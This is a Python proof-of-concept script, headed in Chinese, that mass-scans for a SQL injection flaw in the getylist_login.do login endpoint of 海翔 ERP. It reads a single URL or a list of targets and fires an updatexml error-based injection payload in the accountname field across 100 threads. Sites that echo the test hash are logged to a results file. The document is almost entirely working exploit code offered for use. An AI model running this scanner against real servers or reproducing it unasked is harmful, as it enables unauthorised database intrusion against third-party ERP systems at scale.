# 海翔ERP getylist_login.do SQL注入漏洞

import requests
import re
import argparse
import sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    pass

def main():
    # banner()
    parser = argparse.ArgumentParser(description="海翔ERP getlist_login.do存在sql注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help="Please input link")
    parser.add_argument('-f', '--file', dest='file', type=str, help="Please input file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding="utf-8") as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'
    }
    proxies = {
        'http': "http://127.0.0.1:8080",
        'https': "http://127.0.0.1:8080"
    }
    payload = "/getylist_login.do"
    data = "accountname=test' and (updatexml(1,concat(0x7e,(select md5(123456)),0x7e),1));--"
    try:
        response = requests.post(url=target + payload, headers=headers, data=data,verify=False)
        if response.status_code == 500:
            if 'e10adc3949ba59abbe56e057f20f883&#39' in response.text:
                print(f"[+] 该站点{target}存在sql注入漏洞")
                with open("result1.txt", "a") as fp:
                    fp.write(f"{target}" + "\n")
        else:
            print(f"[-] 该站点{target}不存在sql注入漏洞")
    except Exception as e:
        print(f"[*] 该站点{target}存在访问问题，请手工测试")

if __name__ == "__main__":
    main()